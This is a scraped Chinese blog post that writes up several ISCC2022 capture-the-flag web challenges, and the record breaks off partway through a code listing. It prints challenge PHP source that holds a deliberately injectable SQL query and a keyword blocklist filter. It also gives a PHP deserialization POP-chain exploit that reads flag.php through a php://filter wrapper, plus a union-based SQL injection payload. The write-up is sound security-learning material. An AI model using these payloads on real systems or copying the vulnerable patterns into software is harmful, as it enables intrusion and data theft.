{"blogid": "124973174", "writerAge": "码龄6年", "writerBlogNum": "3", "writerCollect": "6", "writerComment": "2", "writerFan": "2", "writerGrade": "1级", "writerIntegral": "82", "writerName": "柒月酱呐", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_124973174.jpg", "writerRankTotal": "133463", "writerRankWeekly": "1207733", "writerThumb": "3", "writerVisitNum": "7545", "blog_read_count": "878", "blog_time": "于 2022-05-25 20:26:58 发布", "blog_title": "ISCC2022WriteUp", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"Web_0\"></a>Web</h1>\n<h2><a id=\"_1\"></a>冬奥会</h2>\n<ul><li>PHP代码审计</li></ul>\n<p>解题过程如下：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$Step1</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$Step2</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$Information</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'{\"year\":\"2022a\",\"items\":\"skiing\"}'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"k\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"i\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$info</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">array</span><span class=\"token punctuation\">)</span><span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'{\"year\":\"2022a\",\"items\":[\"ski\",[\"i\"],0]}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"dump!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">NULL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"is_numeric done!\\n\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"year\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2022</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token variable\">$Step1</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">True</span><span class=\"token punctuation\">:</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Step1</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Step1OK\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Fail\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"isarry!\\n\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">OR</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">OR</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token number\">3</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~~~~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Done!\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$status</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_search</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"skiing\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$status</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">false</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~++++\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">NULL</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"items\"</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$val</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"skiing\"</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Sorry~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">NULL</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$Step2</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Step1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$Step2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h2><a id=\"2_61\"></a>爱国敬业好青年-2</h2>\n<p>提交后报这个：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/2b65b49cc243e15ff0468ab4665035c7.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=123&amp;id=u8f1523a6&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=152&amp;originWidth=567&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=7443&amp;status=done&amp;style=none&amp;taskId=ua245faee-92ef-4716-a435-c4eae0a3b02&amp;title=&amp;width=457.41175004296343)<br/> 查看源码：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/dc4557d982b0cdd9b15b79fe250bd4b5.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=767&amp;id=ubac07273&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=951&amp;originWidth=1918&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=177991&amp;status=done&amp;style=none&amp;taskId=u22098403-dc02-451d-8e87-8fc15c08072&amp;title=&amp;width=1547.2940680465676)<br/> 可知在真正的提交上面套了一层<code>**iframe**</code><br/> 删除，得到入口：(按钮被disable了)<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/f90cccb31b64d9d6416a84914d16af8e.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=744&amp;id=u25e3b4c4&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=922&amp;originWidth=1490&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=96851&amp;status=done&amp;style=none&amp;taskId=u2cf286fb-cf7b-4259-bd58-7d2a5b7eee6&amp;title=&amp;width=1202.0167681905036)<br/> 分析可知：<br/> GET /change 开启传参<br/> POST /change 关闭传参<br/> PSOT /flag 为入口<br/> 结合提示，参考没人解出来的青年一，经纬度应该是北京天安门的坐标<br/> 使用HackBar传参即可拿到flag（<strong>一定要先用GET /change开启传参！</strong>）<br/> <code>payload：lati=116°23′E&amp;langti=39°54′N </code></p>\n<h2><a id=\"Pop2022_77\"></a>Pop2022</h2>\n<p>![image.png](https://img-blog.csdnimg.cn/img_convert/5ffcbf3f30f428d0f3c6a84fe8bf6696.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=796&amp;id=u25d00e2d&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=987&amp;originWidth=705&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=26460&amp;status=done&amp;style=none&amp;taskId=ue8614e5c-9ae0-491f-803d-4d604ffcad4&amp;title=&amp;width=568.7394775666477)<br/> 不愧是pop子，真就pop链呗（）<br/> EXP如下：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Road_is_Long</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Make_a_Change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Try_Work_Hard</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/convert.base64-encode/resource=flag.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Make_a_Change</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$effort</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">page</span><span class=\"token operator\">-&gt;</span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">effort</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Try_Work_Hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"EasySQL_101\"></a>Easy-SQL</h2>\n<p>老老实实手注吧，sqlmap跑不出来的()：<code>id=-8 union table emails limit 7,1 </code><br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/02aacf23e424d9b3b06b2adccf1f6a3e.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=349&amp;id=u58f9a519&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=432&amp;originWidth=937&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=27208&amp;status=done&amp;style=none&amp;taskId=u07c9c80e-0f1d-43dd-8340-94fdfea64f3&amp;title=&amp;width=755.8991354325516)<br/> 谁用压缩包当邮箱地址啊（恼<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/90c8dede54676d6859acdd37ba4f370f.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=232&amp;id=u2e4aebef&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=288&amp;originWidth=667&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=14004&amp;status=done&amp;style=none&amp;taskId=u6907e81e-8eef-4a19-a400-44f05bca5f7&amp;title=&amp;width=538.0840163644738)</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"./config.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// error_reporting(0);</span>\n<span class=\"token comment\">// highlight_file(__FILE__);</span>\n<span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_errno</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Connection failed: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_errno</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Where is the database?\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"try ?id\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">sqlWaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|\"|\\^|\\||\\ |\\'/i'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filter</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select * from users where id=<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$safe</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/select/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$safe</span><span class=\"token operator\">!==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"No select!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> \n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3&gt;\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/h3&gt;&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3&gt;\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/h3&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;br&gt;Error!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$passwd</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">sqlWaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'damn hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">num_rows</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"username or passwd wrong, are you admin?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token 